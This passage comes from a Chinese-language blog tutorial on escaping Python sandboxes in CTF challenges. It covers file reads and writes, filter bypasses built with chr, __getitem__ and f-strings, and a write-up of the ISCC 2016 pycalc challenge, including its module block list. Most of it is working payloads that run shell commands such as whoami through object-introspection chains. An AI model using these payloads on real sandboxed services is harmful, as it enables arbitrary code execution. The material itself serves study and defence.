+<p>（这里顺手记录下，对于字典键是整数型的比如 <code>{"1":2}</code>，format 是无法拿到值的 😃，这样会报错：<code>''' {0['1']} '''.format({"1":2})</code>，<code>'1'</code> 引号去掉的话又会报没有这个键，这个特性可以见<a href="https://docs.python.org/3/library/string.html#format-string-syntax" rel="nofollow">文档</a>）</p> 
+<p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p> 
+<p>最后，其实沙箱逃逸，对于不同的第三方库可能会存在一些特殊的利用方式，比如 <code>jinja2</code>，这类属于 <code>SSTI</code> 漏洞，可以看这个：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" rel="nofollow">传送门🚪</a>，这里就不多说了。</p> 
+<p>其实 SSTI 也会用到这里的很多技巧，两者知识面相互交叠。</p> 
+<h3><a id="_641"></a>文件读写</h3> 
+<p>2.x 有个内建的 <code>file</code>：</p> 
+<pre><code>&gt;&gt;&gt; file('key').read()
+'Macr0phag3\n'
+&gt;&gt;&gt; file('key', 'w').write('Macr0phag3')
+&gt;&gt;&gt; file('key').read()
+'Macr0phag3'
+</code></pre> 
+<p>还有个 <code>open</code>，2.x 与 3.x 通用。</p> 
+<p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>®。</p> 
+<p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来：<br> math.py：</p> 
+<pre><code>import os
+
+print(os.system('whoami'))
+</code></pre> 
+<p>调用</p> 
+<pre><code>&gt;&gt;&gt; import math
+macr0phag3
+0
+</code></pre> 
+<p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p> 
+<pre><code>&gt;&gt;&gt; 're' in sys.modules
+True
+&gt;&gt;&gt; 'math' in sys.modules
+False
+&gt;&gt;&gt;
+</code></pre> 
+<p>当然在<code>import re</code> 之前<code>del sys.modules['re']</code>也不是不可以…</p> 
+<p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p> 
+<p>读文件暂时没什么发现特别的地方。</p> 
+<p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p> 
+<pre><code>&gt;&gt;&gt; __builtins__.open('key').read()
+'Macr0phag3\n'
+</code></pre> 
+<p>或者</p> 
+<pre><code>&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]('key').read()
+'Macr0phag3'
+</code></pre> 
+<h3><a id="_714"></a>敏感信息泄露</h3> 
+<p>这个也算只能读吧。</p> 
+<ol><li><code>dir()</code></li><li><code>__import__("__main__").x</code></li><li><code>x.__dict__</code></li><li><code>locals()</code></li><li><code>globals()</code></li><li><code>vars()</code></li><li><code>sys._getframe(0).f_code.co_varnames</code></li><li><code>sys._getframe(0).f_locals</code></li><li>…</li></ol> 
+<p>这有一篇不错的文章，推荐阅读：</p> 
+<p>https://www.cnblogs.com/dechinphy/p/modify-locals.html</p> 
+<h3><a id="_732"></a>其他</h3> 
+<p>这些行为不像是 oj 会做得出来的，ctf 倒是有可能出现。</p> 
+<h4><a id="___736"></a>过滤 [ ]</h4> 
+<p>应对的方式就是将<code>[]</code>的功能用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：</p> 
+<pre><code>&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()
+'macr0phag3\n'
+</code></pre> 
+<p>当然，dict 也是可以 pop 的：<code>{"a": 1}.pop("a")</code></p> 
+<h4><a id="_749"></a>过滤引号</h4> 
+<blockquote> 
+ <p>chr</p> 
+</blockquote> 
+<p>最简单就是用 <code>chr</code> 啦</p> 
+<pre><code>os.system(
+    chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)
+)
+</code></pre> 
+<blockquote> 
+ <p>扣字符</p> 
+</blockquote> 
+<p>利用 <code>str</code> 和 <code>[]</code>，挨个把字符拼接出来</p> 
+<pre><code>os.system(
+    str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]
+)
+</code></pre> 
+<p>当然 <code>[]</code> 如果被过滤了也可以 bypass，前面说过了。</p> 
+<blockquote> 
+ <p>格式化字符串</p> 
+</blockquote> 
+<p>那过滤了引号，格式化字符串还能用吗？</p> 
+<pre><code>(chr(37)+str({}.__class__)[1])%100 == 'd'  # (%c)%100
+</code></pre> 
+<p>又起飞了…</p> 
+<blockquote> 
+ <p>dict() 拿键它不香吗？</p> 
+</blockquote> 
+<pre><code>'whoami' ==
+list(dict(whoami=1))[0] ==
+str(dict(whoami=1))[2:8] ==
+</code></pre> 
+<h4><a id="_796"></a>利用新特性</h4> 
+<p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features" rel="nofollow">传送门🚪</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings" rel="nofollow">传送门🚪</a>。所以我们就有了一种船新的利用方式：</p> 
+<pre><code>&gt;&gt;&gt; f'{__import__("os").system("whoami")}'
+macr0phag3
+'0'
+</code></pre> 
+<p>关注每次版本增加的新特性，或许能淘到点宝贝。</p> 
+<h4><a id="_811"></a>利用反序列化攻击</h4> 
+<p>反序列化攻击也是能用来逃逸，但是关于反序列化攻击的安全问题还挺多的，我专门写了篇文章，见：<a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/" rel="nofollow">传送门🚪</a></p> 
+<p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p> 
+<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python2</span>
+<span class="token comment"># -*- coding:utf-8 -*-</span>
+
+
+<span class="token keyword">def</span> <span class="token function">banner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> <span class="token string">"============================================="</span>
+    <span class="token keyword">print</span> <span class="token string">"   Simple calculator implemented by python   "</span>
+    <span class="token keyword">print</span> <span class="token string">"============================================="</span>
+    <span class="token keyword">return</span>
+
+
+<span class="token keyword">def</span> <span class="token function">getexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"&gt;&gt;&gt; "</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">_hook_import_</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    module_blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'time'</span><span class="token punctuation">,</span> <span class="token string">'bdb'</span><span class="token punctuation">,</span> <span class="token string">'bsddb'</span><span class="token punctuation">,</span> <span class="token string">'cgi'</span><span class="token punctuation">,</span>
+                        <span class="token string">'CGIHTTPServer'</span><span class="token punctuation">,</span> <span class="token string">'cgitb'</span><span class="token punctuation">,</span> <span class="token string">'compileall'</span><span class="token punctuation">,</span> <span class="token string">'ctypes'</span><span class="token punctuation">,</span> <span class="token string">'dircache'</span><span class="token punctuation">,</span>
+                        <span class="token string">'doctest'</span><span class="token punctuation">,</span> <span class="token string">'dumbdbm'</span><span class="token punctuation">,</span> <span class="token string">'filecmp'</span><span class="token punctuation">,</span> <span class="token string">'fileinput'</span><span class="token punctuation">,</span> <span class="token string">'ftplib'</span><span class="token punctuation">,</span> <span class="token string">'gzip'</span><span class="token punctuation">,</span>
+                        <span class="token string">'getopt'</span><span class="token punctuation">,</span> <span class="token string">'getpass'</span><span class="token punctuation">,</span> <span class="token string">'gettext'</span><span class="token punctuation">,</span> <span class="token string">'httplib'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'imputil'</span><span class="token punctuation">,</span>
+                        <span class="token string">'linecache'</span><span class="token punctuation">,</span> <span class="token string">'macpath'</span><span class="token punctuation">,</span> <span class="token string">'mailbox'</span><span class="token punctuation">,</span> <span class="token string">'mailcap'</span><span class="token punctuation">,</span> <span class="token string">'mhlib'</span><span class="token punctuation">,</span> <span class="token string">'mimetools'</span><span class="token punctuation">,</span>
+                        <span class="token string">'mimetypes'</span><span class="token punctuation">,</span> <span class="token string">'modulefinder'</span><span class="token punctuation">,</span> <span class="token string">'multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'netrc'</span><span class="token punctuation">,</span> <span class="token string">'new'</span><span class="token punctuation">,</span>
+                        <span class="token string">'optparse'</span><span class="token punctuation">,</span> <span class="token string">'pdb'</span><span class="token punctuation">,</span> <span class="token string">'pipes'</span><span class="token punctuation">,</span> <span class="token string">'pkgutil'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'popen2'</span><span class="token punctuation">,</span> <span class="token string">'poplib'</span><span class="token punctuation">,</span>
+                        <span class="token string">'posix'</span><span class="token punctuation">,</span> <span class="token string">'posixfile'</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token string">'pstats'</span><span class="token punctuation">,</span> <span class="token string">'pty'</span><span class="token punctuation">,</span> <span class="token string">'py_compile'</span><span class="token punctuation">,</span>
+                        <span class="token string">'pyclbr'</span><span class="token punctuation">,</span> <span class="token string">'pydoc'</span><span class="token punctuation">,</span> <span class="token string">'rexec'</span><span class="token punctuation">,</span> <span class="token string">'runpy'</span><span class="token punctuation">,</span> <span class="token string">'shlex'</span><span class="token punctuation">,</span> <span class="token string">'shutil'</span><span class="token punctuation">,</span> <span class="token string">'SimpleHTTPServer'</span><span class="token punctuation">,</span>
+                        <span class="token string">'SimpleXMLRPCServer'</span><span class="token punctuation">,</span> <span class="token string">'site'</span><span class="token punctuation">,</span> <span class="token string">'smtpd'</span><span class="token punctuation">,</span> <span class="token string">'socket'</span><span class="token punctuation">,</span> <span class="token string">'SocketServer'</span><span class="token punctuation">,</span>
+                        <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'sysconfig'</span><span class="token punctuation">,</span> <span class="token string">'tabnanny'</span><span class="token punctuation">,</span> <span class="token string">'tarfile'</span><span class="token punctuation">,</span> <span class="token string">'telnetlib'</span><span class="token punctuation">,</span>
+                        <span class="token string">'tempfile'</span><span class="token punctuation">,</span> <span class="token string">'Tix'</span><span class="token punctuation">,</span> <span class="token string">'trace'</span><span class="token punctuation">,</span> <span class="token string">'turtle'</span><span class="token punctuation">,</span> <span class="token string">'urllib'</span><span class="token punctuation">,</span> <span class="token string">'urllib2'</span><span class="token punctuation">,</span>
+                        <span class="token string">'user'</span><span class="token punctuation">,</span> <span class="token string">'uu'</span><span class="token punctuation">,</span> <span class="token string">'webbrowser'</span><span class="token punctuation">,</span> <span class="token string">'whichdb'</span><span class="token punctuation">,</span> <span class="token string">'zipfile'</span><span class="token punctuation">,</span> <span class="token string">'zipimport'</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> forbid <span class="token keyword">in</span> module_blacklist<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> name <span class="token operator">==</span> forbid<span class="token punctuation">:</span>        <span class="token comment"># don't let user import these modules</span>
+            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'No you can\' import {0}!!!'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>forbid<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment"># normal modules can be imported</span>
+    <span class="token keyword">return</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">sandbox_filter</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">,</span> <span class="token string">'__setitem__'</span><span class="token punctuation">,</span>
+                 <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> forbid <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> forbid <span class="token keyword">in</span> command<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token number">0</span>
+    <span class="token keyword">return</span> <span class="token number">1</span>
+
+
+<span class="token keyword">def</span> <span class="token function">sandbox_exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># sandbox user input</span>
+    result <span class="token operator">=</span> <span class="token number">0</span>
+    __sandboxed_builtins__ <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>__builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>
+    __sandboxed_builtins__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _hook_import_    <span class="token comment"># hook import</span>
+    <span class="token keyword">del</span> __sandboxed_builtins__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>
+    _global <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> __sandboxed_builtins__
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> sandbox_filter<span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">'Malicious user input detected!!!'</span>
+        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    command <span class="token operator">=</span> <span class="token string">'result = '</span> <span class="token operator">+</span> command
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">exec</span> command <span class="token keyword">in</span> _global     <span class="token comment"># do calculate in a sandboxed environment</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> e
+        <span class="token keyword">return</span> <span class="token number">0</span>
+    result <span class="token operator">=</span> _global<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span>  <span class="token comment"># extract the result</span>
+    <span class="token keyword">return</span> result
+
+
+banner<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+    command <span class="token operator">=</span> getexp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> sandbox_exec<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
+
+</code></pre> 
+<p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html" rel="nofollow">传送门🚪</a>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p> 
+<pre><code>&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__
+restricted attribute
+&gt;&gt;&gt; getattr(getattr(__import__('types'), 'FileType')('key'), 're''ad')()
+file() constructor not accessible in restricted mode
+</code></pre> 
+<p>不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p> 
+<pre><code>&gt;&gt;&gt; getattr(__import__('types').__builtins__['__tropmi__'[::-1]]('so'[::-1]), 'mets' 'ys'[::-1])('whoami')
+macr0phag3
+</code></pre> 
+<h3><a id="_912"></a>最后</h3> 
+<p>这块内容本身就零散，罗里吧嗦了这么多，希望对大家有帮助，如果有不严谨的地方希望各位师傅们能指出来，共同探讨 [抱拳]</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/f6366c87dfe66c40cbc2b2b76d021f98/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">flask sssti lab闯关记录</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/b64d439e64239af99307dec7e8890565/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">php学习</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 追风少年的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
